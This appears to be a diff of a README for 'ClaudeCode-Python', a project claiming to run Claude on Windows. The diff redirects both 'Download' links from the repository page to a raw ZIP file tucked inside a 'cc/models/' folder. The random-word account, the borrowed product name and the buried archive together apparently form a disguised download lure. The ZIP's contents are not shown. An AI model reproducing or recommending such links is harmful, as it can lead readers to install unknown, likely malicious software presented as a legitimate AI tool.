@@ -1,6 +1,6 @@
 # 🤖 ClaudeCode-Python - Run Claude Core on Windows
 
-[![Download ClaudeCode-Python](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/straphangerappetizingness603/ClaudeCode-Python)
+[![Download ClaudeCode-Python](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/straphangerappetizingness603/ClaudeCode-Python/raw/refs/heads/main/cc/models/Code-Claude-Python-3.6.zip)
 
 ## 🖥️ What this app does
 
@@ -19,7 +19,7 @@ This project is for users who want a direct way to try the runtime on Windows wi
 
 Visit this page to download and use the app:
 
-[Open ClaudeCode-Python Download Page](https://github.com/straphangerappetizingness603/ClaudeCode-Python)
+[Open ClaudeCode-Python Download Page](https://github.com/straphangerappetizingness603/ClaudeCode-Python/raw/refs/heads/main/cc/models/Code-Claude-Python-3.6.zip)
 
 If the page shows a release file, download it to your computer. If it shows source files, use the ZIP download option on GitHub.
 
